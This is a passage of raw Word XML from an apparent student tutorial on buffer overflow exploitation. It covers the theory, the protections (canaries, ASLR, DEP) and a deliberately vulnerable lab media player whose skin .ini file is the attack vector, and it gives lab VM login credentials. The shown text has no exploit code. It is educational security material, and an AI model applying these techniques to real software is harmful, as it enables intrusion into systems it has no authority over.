        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidRPr="00822837">
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="20FE0EF6" w14:textId="4327E318" w:rsidR="007431F4" w:rsidRPr="003D424B" w:rsidRDefault="00341658" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc102919465"/>
      <w:bookmarkStart w:id="3" w:name="_Toc103326447"/>
      <w:r>
        <w:t>Background</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="10076850" w14:textId="11948B78" w:rsidR="00206C0A" w:rsidRPr="007431F4" w:rsidRDefault="00206C0A" w:rsidP="00A17C85">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc102919466"/>
      <w:bookmarkStart w:id="5" w:name="_Toc103326448"/>
      <w:r>
        <w:t>Buffer Overflow History and Causes</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="68535313" w14:textId="03AA2E64" w:rsidR="0082349D" w:rsidRDefault="007431F4" w:rsidP="008332D2">
      <w:r>
        <w:t>Buffer Overflow, or ‘Buffer Overrun’ exploits have dominated the world of secure programming for decades. These seemingly simple exploits are characterized using carefully crafted files to force applications to read and execute code outside of their established boundary and should not be underestimated in their potential to be discovered and misused by attackers. Since their initial discovery</w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t xml:space="preserve"> and due to their worldwide impact</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="009436BC">
        <w:t>buffer overflow attacks</w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t xml:space="preserve"> and their respective prevention techniques </w:t>
      </w:r>
      <w:r w:rsidR="009436BC">
        <w:t>have be</w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t xml:space="preserve">come essential knowledge for the budding programmer. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118720B8" w14:textId="0330FC1E" w:rsidR="007431F4" w:rsidRDefault="0082349D" w:rsidP="008332D2">
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="007431F4">
        <w:t xml:space="preserve">hese exploits most often appear in amateurish, unsecured code that relies on </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t>numerous</w:t>
      </w:r>
      <w:r w:rsidR="007431F4">
        <w:t xml:space="preserve"> external files and data to function, code that runs </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t xml:space="preserve">unpredictably </w:t>
      </w:r>
      <w:r w:rsidR="007431F4">
        <w:t xml:space="preserve">- common in situations where programmers have based their code off simplistic tutorials without regards for security - and  generally any code where malicious code can be input into </w:t>
      </w:r>
      <w:r w:rsidR="00154A92">
        <w:t>an undersized buffer</w:t>
      </w:r>
      <w:r w:rsidR="00206C0A">
        <w:t xml:space="preserve"> and incorrectly executed by the program</w:t>
      </w:r>
      <w:r w:rsidR="0041564A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:id w:val="540249499"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="0041564A">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="0041564A">
            <w:rPr>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Clo22 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="0041564A">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:t>(CloudFlare, 2022)</w:t>
          </w:r>
          <w:r w:rsidR="0041564A">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00206C0A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AAC5CBC" w14:textId="35782681" w:rsidR="00056019" w:rsidRDefault="00534E15" w:rsidP="00056019">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc103326449"/>
      <w:bookmarkStart w:id="7" w:name="_Toc102919468"/>
      <w:r>
        <w:t>Vulnerability Theory</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="5DB405BC" w14:textId="508AB8CC" w:rsidR="00FE3B22" w:rsidRDefault="00AB2D0B" w:rsidP="00056019">
      <w:r>
        <w:t>Buffer Overflows</w:t>
      </w:r>
      <w:r w:rsidR="002E4CF5">
        <w:t xml:space="preserve"> occur when a program </w:t>
      </w:r>
      <w:r w:rsidR="00273301">
        <w:t xml:space="preserve">is given a bigger input than it can handle, for example, a large </w:t>
      </w:r>
      <w:r w:rsidR="00140B87">
        <w:t>number of</w:t>
      </w:r>
      <w:r w:rsidR="00273301">
        <w:t xml:space="preserve"> characters or integers. </w:t>
      </w:r>
      <w:r w:rsidR="00140B87">
        <w:t>Once submitted, the user input is</w:t>
      </w:r>
      <w:r w:rsidR="00273301">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00140B87">
        <w:t>then sent to</w:t>
      </w:r>
      <w:r w:rsidR="00273301">
        <w:t xml:space="preserve"> a buffer</w:t>
      </w:r>
      <w:r w:rsidR="00140B87">
        <w:t xml:space="preserve">, a small memory location which temporarily holds data as it transitions from one memory location to another. </w:t>
      </w:r>
      <w:r w:rsidR="007A304D">
        <w:t>If the size of the data is bigger than the buffer is programmed to handle,</w:t>
      </w:r>
      <w:r w:rsidR="003A1FA4">
        <w:t xml:space="preserve"> like</w:t>
      </w:r>
      <w:r w:rsidR="007A304D">
        <w:t xml:space="preserve"> taking in an input of 18 bytes when only programmed to handle 16 bytes, </w:t>
      </w:r>
      <w:r w:rsidR="003A1FA4">
        <w:t>this</w:t>
      </w:r>
      <w:r w:rsidR="007A304D">
        <w:t xml:space="preserve"> unprotected buffer will then leak the excess bytes past its boundary, potentially overwriting the memory locations adjacent to it and either making the program run unpredictably or outright crash. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F8264B" w14:textId="19B48A3D" w:rsidR="007A304D" w:rsidRDefault="00372725" w:rsidP="00056019">
      <w:r>
        <w:t xml:space="preserve">Attackers can exploit this vulnerability to have the program read custom instructions named ‘shellcode’, the use of which ranges from opening the computer’s calculator app as a safe way to prove the vulnerability exists </w:t>
      </w:r>
      <w:r w:rsidR="00EE727F">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">creating a reverse shell. </w:t>
      </w:r>
      <w:r w:rsidR="00FE3B22">
        <w:t>This vulnerability can also be found in servers, which can be open to Remote Buffer Overflow attacks exploited over the internet, however this tutorial will only focus on local application exploits</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302C0AF9" w14:textId="1F35B6A3" w:rsidR="00206C0A" w:rsidRDefault="00206C0A" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc103326450"/>
      <w:r>
        <w:t>Attack Fundamentals</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="5930AA13" w14:textId="3CA8281D" w:rsidR="00C3473A" w:rsidRDefault="00D41672" w:rsidP="008332D2">
      <w:r>
        <w:t xml:space="preserve">In order for a buffer overflow attack to take place, the target application must </w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t>adhere to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> following criteria, described in OWASP’s Developer Guide</w:t>
      </w:r>
      <w:r w:rsidR="00C5715B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:id w:val="490140790"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="002718F6">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00C26F2A">
            <w:instrText xml:space="preserve">CITATION OWA21 \n  \t  \l 1033 </w:instrText>
          </w:r>
          <w:r w:rsidR="002718F6">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC">
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <w:t>(2021)</w:t>
          </w:r>
          <w:r w:rsidR="002718F6">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00C3473A">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1158B0E9" w14:textId="51D450E8" w:rsidR="00206C0A" w:rsidRDefault="00C3473A" w:rsidP="008332D2">
      <w:r>
        <w:t>The program must…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8EFDF7" w14:textId="4120BAC9" w:rsidR="00C3473A" w:rsidRDefault="00C3473A" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>be written in or depend on a language that is vulnerable to buffer overflow attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBF4B6C" w14:textId="34E133F3" w:rsidR="00524C9B" w:rsidRDefault="00C3473A" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">take </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t xml:space="preserve">an </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">input from </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> user, which is then not sanitized by the program</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDE9088" w14:textId="3A90CC2A" w:rsidR="008332D2" w:rsidRDefault="00C3473A" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>not feature any general overflow protection, for example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF53C26" w14:textId="77777777" w:rsidR="003B172E" w:rsidRDefault="003B172E" w:rsidP="003B172E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69FAA3BC" w14:textId="6EEA2C5A" w:rsidR="008332D2" w:rsidRDefault="00C3473A" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008332D2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Canary Values</w:t>
      </w:r>
      <w:r>
        <w:t>, which are placed at the overflow point and verified each time the program is run to ensure they have not been overwritten.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B4681E" w14:textId="77777777" w:rsidR="008332D2" w:rsidRDefault="008332D2" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19398491" w14:textId="71E43D3D" w:rsidR="008332D2" w:rsidRDefault="00C3473A" w:rsidP="00062A41">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008332D2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Address Space Randomization</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:t>since buffer overflow attacks rely on consistent address space locations</w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>this technique moves them around unpredictably</w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t xml:space="preserve"> to prevent the attacks from taking place</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC97FD3" w14:textId="77777777" w:rsidR="008332D2" w:rsidRDefault="008332D2" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49C06873" w14:textId="14906B47" w:rsidR="00C3473A" w:rsidRDefault="00C3473A" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="008332D2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Data Execution Prevention</w:t>
      </w:r>
      <w:r w:rsidR="002834C9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (DEP)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which can be used to label parts of memory to either allow or </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t>prevent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> code execution from taking place, stopping malicious code from being run by the program</w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t xml:space="preserve"> if correctly set up</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754BF988" w14:textId="77777777" w:rsidR="0009036D" w:rsidRDefault="0009036D" w:rsidP="008332D2"/>
    <w:p w14:paraId="1A577E84" w14:textId="7EA3337E" w:rsidR="0009036D" w:rsidRDefault="0009036D" w:rsidP="008332D2">
      <w:r>
        <w:t>If all the previous points apply, then it is highly likely a program is vulnerable to this exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CDD8AD" w14:textId="7B56DFAB" w:rsidR="007431F4" w:rsidRDefault="00FD533F" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc102919469"/>
      <w:bookmarkStart w:id="10" w:name="_Toc103326451"/>
      <w:r>
        <w:t>The Application</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="5F0CE82B" w14:textId="712E0CF3" w:rsidR="003A1FA4" w:rsidRDefault="00C076E7" w:rsidP="00C076E7">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The application that </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>is being</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exploited </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidR="003A1FA4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00372725">
        <w:t>32-bit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Media Player application</w:t>
      </w:r>
      <w:r w:rsidR="00D40998">
        <w:t xml:space="preserve"> based on CoolPlayer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> named “Vulnerable Media Player”</w:t>
      </w:r>
      <w:r w:rsidR="00D40998">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">with the filename “2003114.exe”. Prior to the investigation, it was stated that the media player had a buffer overflow vulnerability in its “skin </w:t>
      </w:r>
      <w:r w:rsidR="00610A08">
        <w:t>switch</w:t>
      </w:r>
      <w:r>
        <w:t>” feature, which under normal circumstances would</w:t>
      </w:r>
      <w:r w:rsidR="006800F8">
        <w:t xml:space="preserve"> be used to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> change the appearance of the player</w:t>
      </w:r>
      <w:r w:rsidR="00D0374C">
        <w:t xml:space="preserve"> by locating an appearance </w:t>
      </w:r>
      <w:r w:rsidR="004B7710">
        <w:t xml:space="preserve">file </w:t>
      </w:r>
      <w:r w:rsidR="00C66B0A">
        <w:t>specified</w:t>
      </w:r>
      <w:r w:rsidR="004B7710">
        <w:t xml:space="preserve"> by the user</w:t>
      </w:r>
      <w:r w:rsidR="00C66B0A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120DAA7E" w14:textId="52ADC22B" w:rsidR="00D40998" w:rsidRDefault="003A1FA4" w:rsidP="00C076E7">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="79CB7ED5" wp14:editId="43E448EC">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>807720</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>579475</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4486275" cy="317182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86275" cy="3171825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00D40998">
        <w:t>Custom skins for the player come in .bmp (bitmap) form, with another .ini file determining the location of buttons and size of the window.</w:t>
      </w:r>
      <w:r w:rsidR="004B7710">
        <w:t xml:space="preserve"> However, only the .ini file was needed for the exploit to work.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BCB87A" w14:textId="42C17E48" w:rsidR="006D5BB6" w:rsidRPr="006D5BB6" w:rsidRDefault="00C076E7" w:rsidP="003A1FA4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - The media player's default appearance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661455E0" w14:textId="39885236" w:rsidR="008332D2" w:rsidRDefault="008332D2" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc103326452"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Aims</w:t>
      </w:r>
      <w:r w:rsidR="002E506C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C6E68">
        <w:t>and Objectives</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="4B889A61" w14:textId="40D03F44" w:rsidR="003A1FA4" w:rsidRDefault="004D7B3D" w:rsidP="003A1FA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The aims of this project</w:t>
      </w:r>
      <w:r w:rsidR="000A1BB9">
        <w:t xml:space="preserve"> were to </w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t>demonstrate a buffer overflow exploit and to document the steps taken in order to produce a comprehensive tutorial</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>, covering the standard overflow procedures for systems with DEP enabled and disabled</w:t>
      </w:r>
      <w:r w:rsidR="007A1886">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E30211C" w14:textId="6405BF4B" w:rsidR="006E1444" w:rsidRDefault="007A1886" w:rsidP="003A1FA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This tutorial was to be written for someone who has experience with the more technical side of </w:t>
      </w:r>
      <w:r w:rsidR="00FD533F">
        <w:t xml:space="preserve">computing but has </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t xml:space="preserve">never performed </w:t>
      </w:r>
      <w:r w:rsidR="00FD533F">
        <w:t>a buffer overflow exploit</w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t xml:space="preserve"> before</w:t>
      </w:r>
      <w:r w:rsidR="00FD533F">
        <w:t xml:space="preserve">, for example, a Year 3 University Student studying Cybersecurity. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D25ED4" w14:textId="40B658B0" w:rsidR="004D7B3D" w:rsidRDefault="00FD533F" w:rsidP="003A1FA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The tutorial </w:t>
      </w:r>
      <w:r w:rsidR="00C6130C">
        <w:t xml:space="preserve">was </w:t>
      </w:r>
      <w:r w:rsidR="003B172E">
        <w:t xml:space="preserve">designed </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">to be intuitive and educational, informing the reader of the reasoning behind each important step as well as any difficulties that the user may face, taking them into account </w:t>
      </w:r>
      <w:r w:rsidR="00062A41">
        <w:t>such that the reader c</w:t>
      </w:r>
      <w:r w:rsidR="00F94AB9">
        <w:t>ould</w:t>
      </w:r>
      <w:r w:rsidR="00062A41">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>successfully replicate the attack</w:t>
      </w:r>
      <w:r w:rsidR="00062A41">
        <w:t xml:space="preserve"> using the tools and </w:t>
      </w:r>
      <w:r w:rsidR="006E1444">
        <w:t>procedure provided.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C526E7" w14:textId="51C8DAC7" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc102919471"/>
      <w:bookmarkStart w:id="13" w:name="_Toc103326453"/>
      <w:r w:rsidRPr="00247263">
        <w:lastRenderedPageBreak/>
        <w:t>Procedur</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
      <w:r w:rsidR="004B7710">
        <w:t xml:space="preserve"> and Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="3A722CE2" w14:textId="0885B6E9" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc102919472"/>
      <w:bookmarkStart w:id="15" w:name="_Toc103326454"/>
      <w:r>
        <w:t>Overview of Procedure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="1F0E2D7F" w14:textId="0AE428A0" w:rsidR="00F34FCF" w:rsidRPr="00F34FCF" w:rsidRDefault="00F34FCF" w:rsidP="008332D2">
      <w:r>
        <w:t xml:space="preserve">The target of this procedure </w:t>
      </w:r>
      <w:r w:rsidR="00F94AB9">
        <w:t>was</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the 2003114.exe application, also named “Vulnerable Media Player”. There are no other files or applications outside this scope. This application was provided alongside a Windows XP SP3 Virtual Machine featuring the following pre-installed tools with which the exploits were to be developed. The login detail</w:t>
      </w:r>
      <w:r w:rsidR="00372725">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the machine were also provided: </w:t>
      </w:r>
      <w:r w:rsidRPr="00F34FCF">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>administrator/hacklab</w:t>
      </w:r>
      <w:r w:rsidR="005D6A76">
        <w:t>, as well as instructions on how to structure the .ini file in order to crash the program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68406E1A" w14:textId="2376BA4B" w:rsidR="004C3F85" w:rsidRDefault="00E87167" w:rsidP="004C3F85">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc103326455"/>
      <w:r>
        <w:t>Tools and Languages</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9834" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4917"/>
        <w:gridCol w:w="4917"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C3F85" w14:paraId="19727165" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="237"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9D9D9" w:themeFill="background1" w:themeFillShade="D9"/>
          </w:tcPr>
          <w:p w14:paraId="00165B3B" w14:textId="0A4DBF11" w:rsidR="004C3F85" w:rsidRPr="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="004C3F85">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Software and Languages</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9D9D9" w:themeFill="background1" w:themeFillShade="D9"/>
          </w:tcPr>
          <w:p w14:paraId="74B68753" w14:textId="25E9734F" w:rsidR="004C3F85" w:rsidRPr="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="004C3F85">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CC2432">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="73A4CF9C" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="222"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1735B1E8" w14:textId="6EEF0B1C" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>VMware Workstation Pro 16.2.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01F6C9B5" w14:textId="638A30B3" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Used to host the tools listed below.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="41C02D4B" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="1422"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
